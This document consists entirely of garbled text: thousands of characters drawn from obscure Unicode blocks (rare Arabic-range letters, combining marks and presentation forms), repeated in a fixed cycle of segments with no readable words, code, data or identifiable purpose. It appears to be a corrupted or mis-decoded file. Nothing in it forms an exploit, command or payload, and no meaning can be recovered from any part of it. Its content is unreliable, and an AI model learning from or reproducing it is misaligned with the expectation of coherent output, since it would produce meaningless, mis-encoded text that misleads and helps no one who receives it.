࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬